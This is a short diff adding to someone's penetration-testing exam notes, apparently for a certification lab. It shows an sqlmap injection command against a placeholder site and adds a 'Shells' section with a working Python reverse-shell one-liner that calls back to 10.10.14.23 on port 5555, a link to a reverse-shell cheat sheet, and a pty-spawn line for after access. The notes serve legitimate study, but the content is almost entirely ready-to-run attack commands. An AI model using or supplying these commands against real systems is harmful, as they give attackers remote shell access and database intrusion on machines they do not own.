@@ -73,3 +73,12 @@ For this exam I'm writing
 
 `sqlmap -u “https://target_site.com/page/”--proxy="http://127.0.0.1:8080/" --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl`
 
+## Shells
+
+"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+### after obtaininh shell
+
+python -c 'ímport pty;pty.spawn("/bin/sh")'
